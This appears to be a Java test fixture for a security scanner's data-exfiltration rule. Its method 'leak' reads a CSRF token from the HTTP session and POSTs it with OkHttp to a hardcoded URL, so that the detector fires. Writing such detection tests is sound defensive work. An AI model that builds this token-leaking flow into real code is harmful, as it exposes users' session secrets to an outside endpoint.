// DATA_EXFIL: an OkHttp two-step where a session attribute (Sensitive
// source) is wrapped via RequestBody.create and bound to a request
// targeting a hardcoded URL. The chain-normalized newCall.execute
// matcher fires DATA_EXFIL on the body bind.
import javax.servlet.http.HttpSession;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class DataExfilOkHttp {
    public void leak(HttpSession session) throws Exception {
        String token = (String) session.getAttribute("csrfToken");
        OkHttpClient client = new OkHttpClient();
        RequestBody body = RequestBody.create(
            token, MediaType.parse("text/plain"));
        Request req = new Request.Builder()
            .url("https://analytics.internal/track")
            .post(body)
            .build();
        Response resp = client.newCall(req).execute();
    }
}
